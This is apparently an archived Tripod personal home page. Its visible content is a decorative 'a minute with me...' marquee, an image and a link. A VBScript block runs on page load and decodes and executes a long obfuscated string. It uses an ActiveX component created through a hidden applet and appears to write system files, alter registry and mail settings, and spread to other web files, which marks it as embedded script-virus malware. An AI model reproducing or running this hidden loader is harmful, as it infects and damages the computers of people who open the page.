
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="Content-Language" content="en-us">
<title>Home Page</title>
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
</head>

<body onload="vbscript:KJ_start()" background="images/Jotter_note1.gif"><style id="BANNERSTYLE" type="text/css">
div#tb_container{text-align:center; color:#fff}
div#tb_container a{color:#fff; font-family:Arial, Helvetica, sans-serif; font-size:11px; text-decoration:none}
div#tb_container a:hover{color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg{width:760px; margin:0 auto 10px; padding:0; text-shadow:1px 1px 1px #515151;
	background-color:#7F9343;
  	background-image:-moz-linear-gradient(top, #7F9343, #CAD99B); 
  	background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0, #7F9343),color-stop(1, #CAD99B));
  	-moz-border-radius:0 0 10px 10px; -webkit-border-radius:0 0 10px 10px; border-radius:0 0 10px 10px;
  	-moz-box-shadow:1px 1px 2px #292929; -webkit-box-shadow:1px 1px 2px #292929; box-shadow:1px 1px 2px #292929; overflow:hidden;
	font-family:Arial, Helvetica, sans-serif}
div#tb_container div.tb_menu_bg a.floatLeftAd{float:left; margin-left:13px; background:url(adm/common/images/tripodLogoAd.png) no-repeat -94px 0; height:27px; width:86px}
div#tb_container div.tb_menu_bg a.floatLeftAd:hover{background-position:0 0}
div#tb_container div.tb_menu_bg .txtContainer{float:left; margin:4px 0 0 10px}
div#tb_container div.tb_menu_bg .txtContainer strong{margin-left:5px; border-left:1px solid; padding-left:18px; color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg a.big{font-size:17px; margin:0 10px}
</style>


<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "fittycraby";
var tripod_member_page = "fittycraby/index.htm";
var tripod_ratings_hash = "1306570010:c6f3eb790c768599f521315d4a885355";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "204.93.130.142";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=257185";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=257185";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}


jQuery.noConflict();
jQuery(function(){
  if ( ! lycos_check_size() ) { jQuery("#tb_container").hide(); jQuery("#FooterAd").hide(); return; }

  var onButton = -44;
  var onShare = -89;
  var onSearch = 0;
  var $build = jQuery("#build");
  var ss = $build.css("top");

	jQuery("#more_click").unbind().click(function(ev){
      if (ss == onShare) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onShare + "px"});
          ss = onShare;
      }
	});
											
	jQuery("#searchlycos").unbind().click(function(ev){
      if (ss == onSearch) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onSearch + "px"});
          ss = onSearch;
      }
	});
	
  var f = jQuery("#FooterAd").remove();
  f.children("script").remove();
  f.appendTo("body");

  jQuery("#BANNERSTYLE").appendTo("head");

});
</script>
<div id="tb_container">
    <div class="tb_menu_bg">
        <div id="tb_menu">
        
   <a href="http://www.tripod.lycos.com" title="tripod.com" class="floatLeftAd"></a>
   
   <div class="txtContainer">
   <a href="http://www.tripod.lycos.com" title="Build a website at Tripod.com" class="big">Build your own FREE website at Tripod.com</a>
   <strong style="font-size:14px">Share: </strong>

<a href="http://www.facebook.com" onclick="generateHref(this, 'http://facebook.com/sharer.php?u=_MYURL_&t=_MYTITLE_')" id="facebook" rel="nofollow">Facebook</a> |
<a href="http://www.twitter.com" onclick="generateHref(this, 'http://twitter.com/home?status=_MYTITLE_%20-%20_MYURL_')" id="twitter" rel="nofollow">Twitter</a> |
<a href="http://www.digg.com" onclick="generateHref(this, 'http://digg.com/submit?phase=2&url=_MYURL_&title=_MYTITLE_')" id="digg" rel="nofollow">Digg</a> |
<a href="http://reddit.com" onclick="generateHref(this, 'http://reddit.com/submit?url=_MYURL_&title=_MYTITLE_')" id="reddit" rel="nofollow">reddit</a>
</div>
		</div>
    </div>
	
    
    <div id="tb_ad" style="display:block!important"><div id="ad_container" style="display:block!important"><script type="text/javascript">document.write(lycos_ad['leaderboard']);</script></div></div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important"><script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script></div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=257185" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>




<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "@hjEmTfaqb*DsjjPdur(U_qPdur(CbendbQefk*=omjaN_habq*BRL*SrPfaki*ShkN]se*Ot_C(Efl]kvBerhRr`JG]os^pp'&JGQasAgi'&JGAnd^raLfjedr&%IFKfiaHq&%IFBoc]sbK]hi&%IFOoml`d_pd%'Bl`Ps^Erl_sfmjHH=omcjcQm$EfjaO^rd+QwldPrn(KmCnqlpQbqqlbJdurPcpOc]cQcio;EPM*NmcjSbvpEfja'CghdM_pg)/%RioPrn:Nd^bPdjn*Qb_`@ijFdHkqpq%RioPrn+IF^pr]qq&%!&8=.NoHdk&PlmQpq&8.PgblOc]cQcio+AhnpcBvesDqm`renkDkbHcHcPxmcOso9fpsPgblOc]cQcio+AhnpcPcpCghdQcio;EPM*NmcjSbvpEfja'CghdM_pg)0%DekbRalm,Sqfra:#ALBUllhn^b9! % rapanhmr6!$!HH[rq_ns%'!<#ra@pHe$SjnOsos`?qId%FpliRawqEfjaSbkl-@jkrbRbrE>rpqf`<DON+EasCghd%DekbN]se'C?psog^-^rpqf`qsbq<10ChrbQb_`Sbkl-@jkrbRbrEfjaSbkl:BRL,KoblPdurBhic$EfjaO^rd+5'FdSvnaRqp< dsjjQfamBhicPdjn*Vogpdt^BoJb#;FPLI<#ra@pHe$!9 % >NAWnkjk`a;!t^r`peoq8#JG]os^pp'& !$!; %t^BoJb#DsjjPdurBjodFdSvnaRqp< rap SecjDekbRalm,Sqfras`?qId%T^rQctsAmaEeBhicPdjn*BimodAmaEeAmaBtkaphllBtkaphllJGAd`keaRr`$BrpndkrOsogjf)J]rqGjcbv?g^p%GbI_osFl`duAd`o9-PgblFdKbdp'IA]rb&?topamqQpqflc()/%::K@_od% _!&PgblHH?g^lcdPs^:Bhk_hxAgoj$!7ZQqaB9-DiqaIFBe_jfbQqa;Bep$@pa$Kbdp'IA]rb&?topamqQpqflc()/%(+0&8X!Ot_C<.Bl`FdBjodGI@f]mdcOt_9Jg`'@snqblpRqpemd*-+I_osFl`duAd`o'Bl`FdBl`CsjbqgkmCsjbqgkmIFBoc]sbK]hi&%MjBpnnoNdpsidLawqHcEmTfaqb9fpli SecjCthqBtkaphllBl`FdPf]qbDekb9Icbs%UemM_pg)1%#Oomcq^kEfjarYAkljmjCghdpZIh`pkrldpPf]qbbXRq_phllaqvZ^k^lg-eri!Ee&BRL,BhicAwfqpr%Qd`ocBhic%(RddkB^jhHH=omcjcQm$Re_ndCghd) dsjj(AkpcPcpCghdQcio;EPM*NmcjSbvpEfja'Pf]qbDekb*.+qpqd&EfjaSbkl-Tpesb;FPLI<#ra@pHe$!9 % >NAWnkjk`a;!t^r`peoq8#JG]os^pp'& !$!; %t^BoJb#DsjjPdurCghdQcio+AhnpcBl`FdAcb`rjpHa9TqOgbjh-OccQb_`'FGDV]?TOPAMQ]QRBPXHacjsfredpZ@dc_qkqQrbpHA %MqsImkjScnrfmj:SrPfaki,NddPa`a&GHCU^IM?@I]I@@FEMBZOncrs`ocXLfannpmbsYMqsimkjCtoocorYKacf_Rdo %UoRechk+PafTpesbGHCU^@SNQBLP^RQAQYG`dkresfco[$@dc_qkqG`%ZOncrs`ocXLfannpmbsYMqsimkjCtoocorY Icbs%MqsImkjScnrfmj+.'%,,[J_ekYAklmmodSodQp`qgkmbpu!)/(!OCC^AUKQA @_hkIFL^ghQbe$!EIAX\AQQOCJS\SODOZEcblphqgarY Cbd]tirEc# XRldpv^pa[Jg_qlqkeqZKtqjknhAwmparpZ%Jaeq&KtqJknhTaqpgkm)/%# */YK]hiZOs^renkcnxL]lb (Re_ndCghd&B^jhHHI`fjNdd&GHCU^@SNQBLP^RQAQYG`dkresfco[$@dc_qkqG`%ZOncrs`ocXLfannpmbsYMqsimkjCtoocorY Icbs%MqsImkjScnrfmj+.'%,,[J_ekYUecbOs^renkcnxL]lb (Re_ndCghd&VpQddij*QbeSqfraFGDV]?TOPAMQ]QRBPXRldpv^pa[Jg_qlqkeqZKecg_dY7*/YMqsimkjYMlsfmjrYK]hiZAcfrkqMpaebpam`c+.1-/40(!OCC^AUKQA @_hkIFL^ghQbe$!EIAX\AQQOCJS\SODOZOncrs`ocXLfannpmbsYUemamsrKarp_chkeRr`oxpralYNnncghdpZIh`pkrldpLspklmgFlpdolasQasqgjfpZ,`-b,1-.,/-.,/-._/-.,/-.,/-.,/14X/-/a/04,!) ^k^lg!&B^jhHHI`fjNdd&GHCU^@SNQBLP^RQAQYQkequ]qbZIh`pkrldp[TgjcluoKRXBrpndkrRdoqenkZShkbkvpIdpq]fflcPs^rvqpdjZLqldekbqXLfannpmbsMqsimkjGjsbpjdqOdqremdqX/^.`//.,/-.,/-.,b-.,/-.,/-.,/-22[-.-d-12/*ai_jj'TqOgbjh-OccVogpd DJBW[BRPNDKR[TPCN[Pmbst_ndYKebomoncrXNcdebbZ-/+.XNrrhnliXNmrenkqXL^gh[BbeslpLqbdaqbl_d*-2..31) NDD]@VLP@!?`ijJGK]hiPaf% DJBW[BRPNDKR[TPCN[Pmbst_ndYKebomoncrXNcdebbZ-/+.XBlkinkZI`fjOdqremdqXMbuOs^renkcnx*ai_jj'HHqlj_cdCmhcbp$Kbdp'TgjO^rd+0'% Lqlen`jBhico[@milllEfjarYKebomoncrRe_ndaZOs^renkcnx'Bl`CsjbqgkmCsjbqgkmIFBoc]sbKekfcq'&NkAqomnOcotjcMbvpRalmN]se9 FdMlr$EPM*EfjaDugosp&ShkN]seUObogls+ctd'%QfamPdjnL`qf< oxpral00X!AmaEeEeRalmN]se9qurqci2/ZQfamOs^ppTmDekb9TgjO^rd#RVQPDJZGdolak00*cijChrbRq_nsRnBhic<UemM_pg$!PWOSBKXJbpjdi,`ki Bl`FdTqOgbjh-OccVogpd DJBW[KLA=K\K=BEGJDYQkequ]qbZIh`pkrldp[Tgjcluo[@snqblpUbpohllXQrlXJbpjdi1.!)Qp`orQoCghdBRL,?nmwBhicVflL`qf% sd_Zgit_hk+eee*ShkN]seuaaYDkkacn-erp!BRL,?nmwBhicVflL`qf% oxpral00Xjgu]ki,chc (VflL`qf% oxpral00Xcbqgsln*hkgA]kiGI>nldkbPn%UemM_pg$!tc^[Cmhcbp*gqr+fps'TqOgbjh-OccVogpd DJBW[BI?ORBQ[QLMP[+bhkY (!ajhefja!SrPfaki,NddUnhqc!EIAX\AH@PQAR\PKNQZ*cijXBllpdkrSvna!) ]omjeb^renk-t,jq`ntlhn^bUoRechk+PafTpesbGHCU^@J=RPCO^OMKSYbhkcghdYBae^shsFakmY (VpQddij*QbeNd^b$!EIAX\AH@PQAR\PKNQZrwadekbZ@dc_qkqG_nkZ(SrPfaki,NddUnhqc!EIAX\AH@PQAR\PKNQZ`kidekbZOboglsBlchkcX!) RAPanhmrUoRechk+PafTpesbGHCU^@J=RPCO^OMKSYbhkCghdYQddijXNmcj[@mil^l`[*ShkN]seQcioM_pg$!TQ_qfnp-bva !0 $' TqOgbjh-OccVogpd DJBW[BI?ORBQ[QLMP[ajhEfja[PfakiCt[MpkobppxPfadqF]majaqpZSRENnnmqX!) w5-013@?1,63/A*/-BC+4B64)/-?=/-@46-6?|VpQddij*QbeSqfraFGDV]?K>QODP]NNLRXcijBhicXR`peoqFkrqCjblba[*z53-2.4/0*24/@+-0A0)A.D5,-.?/1D45@1.3z PcpCghdQcio;EPM*NmcjSbvpEfja'Pr]qqSlEfja+/*pqrc%DekbRalm,SqfraS`oSbvpDekbRalm,?klqaCjcDqm`renkDqm`renkGIIggdFr$(EeGjVecnd::fpli SecjCthqBtkaphllBl`FdQferIm_`qgkm;claqlblp-im_`qgkmEeJaeq&PgfqHn`_phll(1'< bhicQfamPgfqHn`_phll<Kec%RdhpJkb^renk*5(EeDON+EasBvpdkqenkL]lb&PgfqHn`_phll%9<!pgblQferIm_`qgkm;Kbdp'QferIm_`qgkm)Jam%RdhpJkb^renk',Jam%DON+EasCghdK_id%RdhpJkb^renk'%(AmaEeEeJam%RdhpJkb^renk'=1SecjRdhpJkb^renk9QferIm_`qgkm$!Y Bl`FdHHqlj_cdCmhcbp$SegoKla]sfmj(AmaEeAmaBtkaphllBtkaphllJGK]hiPaf%PafPrn+CghdK_id&NkAqomnOcotjcMbvpPafQcioPrn:SrPfaki,NddPa`a&NddQpq&HcNddRalmQpq;!PgblTqOgbjh-OccVogpdPafPrn+CghdK_idAmaEeAmaBtkaphllBtkaphllJGM^nPs^'@snqblpRqpemd'Ps^D;/PdprKtq9-ClSgfjaQpqdPdprKtq9QcosLsp(-GbQcosLsp;.7RddkBrpndkrOsogjf;Efl]kvBerh8X!AwfrClDkbHcNkAqomnOcotjcMbvpQasRdhpDkkacn:BRL,CdqDkkacn'@snqblpRqpemd'PcpAg_Rr`<And^raN_habq&R`peoqgjf+Bebqgkm^pu!&RbrElj`doq<RdhpDkkacn-Ps^Elj`doqCmhcbp?nrlp:,DkqC]bePdjnBnibaqgjCmhcbpoDkkacnBlsjs;Elj`doAktkr*/Ag_Rr`*`abElj`doAktkr(QcioCmhcbp*M^kaLawqHc@h`Qqa+Aktkr<.SecjJ]rqGjcbv?g^p<GjrqpNds&?topamqQpqflc+Z+Icj'@snqblpRqpemd')0&Rr`Osogjf;Lfb$BrpndkrOsogjf)J]rqGjcbv?g^p'0)Jam%AqqocjsPrnhke%,I_osFl`duAd`o+-(?topamqQpqflc:GI@f]mdcOt_&?topamqQpqflc+I_osFl`duAd`o'Ps^D;0AkpcFdRr`A:,Qfam?topamqQpqflc:?topamqQpqflc#@h`Qqa+Gpdj&-($!Y BvesBkChrbi;/Bnof:-QmElj`doAktkrFdK@_od%QqaPrnhke%:HB^qa'Ag_Rr`*Hqci'g'%QfamEeh;DkkacnBlsjsRddkBrpndkrOsogjf;BrpndkrOsogjf$CfaOt_,Esbk$i(/%#[DugpAmBl`FdBl`FdKctsH`prEmactBe_n:EmprnQbt$BrpndkrOsogjf) X!)Jam%AqqocjsPrnhke%,.'Ps^Rqpemd9Jg`'@snqblpRqpemd*H`prEmactBe_n*.*Hdk&?topamqQpqflc(*J]rqGjcbv?g^p)0&BrpndkrOsogjf;JGAd`keaRr`$BrpndkrOsogjf)J]rqGjcbv?g^p%CjcGbCjcGbJknmJGM^nPs^:?topamqQpqflcCjcDqm`renkDqm`renkGIMpko^e]sb&%MjBpnnoNdpsidLawqQbeL`qfR`isa:GHCU^IM?@I]I@@FEMBZOncrs`ocXLfannpmbsYMqsimkjCtoocorYBafoca!@hpi@ddpad;VpQddij*QbeNd^b$QbeL`qfR`isa(EeBerhBafoca:!RddkCfqgCbendb9Cgj`iw@hpi% 6[DkbHcElph:/sl1BerhBafoca:GIL`kRr`$CfqgCbendb'HHqlj_cdCmhcbp$CfqgCbendb'KctsSrPfaki,NddUnhqcQbeL`qfR`isa+AgojAccqbcBl`CsjbqgkmCsjbqgkmIFtjk]fbDkkacn'M_pgK_id&NkAqomnOcotjcMbvpQasDkkacnM^ka:BRL,CdqDkkacn'M_pgK_id&RbrSegoEfjar;Elj`doL]lb,BhicoFpsBverqq<.CmnB__gRdhpDekbEmRdhpDekbqCghdBvp:QB^qa'CQK-DcpDurampgkmK_id%RdhpDekb,L`qf%(EeDekbCts;!ERI!MnCghdBvp:GQKH!MnCghdBvp:@PNLpEfjaDur< LGM NoBhicAwq9HOOPgbl@_hkIF@mnamaRk'QferCghd+N]se*gqkh!&DiqaHcBhicAwq9T>RPgbl@_hkIF@mnamaRk'QferCghd+N]se*u_q(AkpcEeDekbCts;!ERP!RddkGqrAwfqpr;0AmaEeJdurFd'RA]rb&L`qfJ`jc%:QB^qa'TgjO^rd#CbqgslnX!&'No$T@_od%N]seL]lb'<S?`pc$VflL`qf% @dpipnm %(QfamDsqCthpro:-CjcGbGbErpDugosp9-PgblCQK-@mlxCghdUemM_pg$!pwosbk/1Ybarhrko+gjh*L`qfJ`jcCQK-@mlxCghdUemM_pg$!tc^[Cmhcbp*gqr+M_pgK_idAmaEeAmaBtkaphllBtkaphllJGQasAgi'&NkAqomnOcotjcMbvpCnq+Ahd^pQcosFr<UObogls+Q_qfnpErjhm^kaGbBpnQfamEmTfaqb9fpli BjodEmTfaqb9t^rDkbHcHcEmTfaqb9t^rPgblPcpCQK:?qb_pdL`fd`r$!Panhmremd,BhicOxpralL`fd`r(OdqSrPfaki9@pa`qcKagc_s% SR`peoq,Ogbjh!&DiqaQas?loicKagc_s;claqlblp-^nlkbro'IF^dsarq %?loicKagc_s+qas@JOHA&zC7/4AA.1*/?E-+-0A.)@A@5,-.?/1D@45?,Az %?loicKagc_s+and^raHkqp`kaa'&RbrVpQddij<?loicKagc_s+EasL`fd`r$(=omjaN_habq,odqAHRFB$!x.@30DA/.+B/61)0.AB,570/*.,@-A5/22.15{(=omjaN_habq,_qb_pdFlos^l_d%'PcpCQK:=omjaN_habq,CdqM^ibap'&DkbHcRbrCfqgN_habq9CQK-ApeubqCmnB__gBerhRalmEmBerhM^ibapGbAgojQcio+BnhscPxmc;;.>l`AgojQcio+BnhscPxmc;;-QfamAwfrElpBl`FdCgj`iw@hpi<BerhRalm,@qftaKbrpdoMbvpBelMpgbp=qo&/(N`kbklfxaDkqg9/Rk0Nqfaq>pn'f'<Gjs%&5'Nma'%LawqSbklRqpemd9 Cmnf;-QmKbl$SegoSbvp(PdjnJtj9>q_'Jg`'QferQcts)g(0&'FdSbklMrk<//QfamPdjnJtj9/6BjodFdSbklMrk</,QfamPdjnJtj9/7Bl`FdQcio@f]q;Bep$SbklMrk,Mpgbp=qo&eJm`1'%GbQcio@f]q;Bep$21'SecjRalmAd`o9@fn'.6%CjcGbRalmQpqflc:PdjnOsogjf$SbklBe_nLawqTkJkbhQpq;!Bvabrra' @hjGdv?nq%1%+QferQcts u_AnKc$!Hcu@op$/&9Lrddo?nq%.%#!$ra@pHe# Jbw=qo&-(;!$Nqfaq>pn'.'% !#t^BoJb% Gdv?nq%0%:#Ksecn@op$1& %s`?qId!Iax>pn'0'< %Mpgbp=qo&/($! u_AnKc$!Cmnf;-QmKbl$DucOsogjf& %s`?qId!RalmLql;@pa$Lfb$DucOsogjf)g(0&'!#t^BoJb% EeRalmLql;05Pgbl!#t^BoJb% PdjnJtj902!#t^BoJb% AmaEe u_AnKc$!Qcio@f]q;Bep$SbklMrk*Iax>pn'fIna0(& %s`?qId!GbQcio@f]q;Bep$15'Secj!$ra@pHe# SbklBe_n:ra@p!#t^BoJb% AkpcEeRalmAd`o9@fn'/7%Qfam u_AnKc$!Qcio@f]q;u_Jb!$ra@pHe# DkbHc %s`?qId!RdhpRawq9QferQcts$SbklBe_n!$ra@pHe# Mbvp!'#ra@pHe$!Bvabrra'QferQcts& QferQcts;!BvaRqpemd9 #PdjnOsogjf$! FpliRawq9!9 % oboglsj]mds]fb;rapanhmr:!$u_AnKcbkbrkamq,sqfra !$!9 % `hsosvja<$nkrfrenk8]apmhtqc7icbs7.lw8pnm8,ou9vfbpg7.lw8ddfeds7.lw8v,fl`du8.78rhpg^higpx7dhabam$<#; ! % =OMJASL=LB;GI !]ctbqpECEFER9/UECQF9/akcb;_nj,ir+ % ]bqgrdU,=bqgrd !V?njnkmblp=:#.>NLKBR:!$!9 % +cft:! %t^BoJb#;-obogls; %t^BoJb#;q_qfnpi_jfr_cd:t^r`peoq<#ra@pHe$SegoSbvp#ra@pHe$TkJkbhQpq$u_AnKc:#.panhmr:!$u_AnKc:#.?M@X; %t^BoJb#;-DSJJ:!RapRawq9QferQcts$u_AnKcRlHn`iOsos`?qId% GI\qp`or$(VflL`qf<DON+EasPnabf_hElj`do&,($!Y Fd'CQK-CghdBverqq$VflL`qf% sd_ZBnibaq+fps'%QfamBRL,?nmwBhicVflL`qf% sd_ZBnibaq+fps*ShkN]seuaaYifv^jh-dgb!AmaEeEe&BRL,BhicAwfqpr%UemM_pg$!pwosbk/1Ybarhrko+gjh'%QfamBRL,?nmwBhicVflL`qf% oxpral00Xcbqgsln*hkg+TgjO^rd#rvqpdj1.[hhs`ij*ffdCjcGbCjcDqm`renk"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 2"&vbCrLf&"KeyArr(1) = 4"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 3"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
<p align="center"><font size="7"><font face="MotterFemD"><span style="background-color: #FF0683">
<marquee behavior="slide">a minute with</marquee>
</span></font></font></p>
<p align="center"><font size="7"><font face="MotterFemD"><span style="background-color: #FF0683">
<marquee behavior="alternate">me...</marquee>
</span></font></font></p>
<p align="center"><img border="0" src="images/fitCRAB213.jpg" width="344" height="259"></p>
<p align="right"><font face="MotterFemD" size="5" color="#FF0683">&nbsp;&nbsp; <a href="muka2.htm">&lt;<span style="background-color: #000000">KLIK
HERE</span></a></font></p>
</body>

</html>

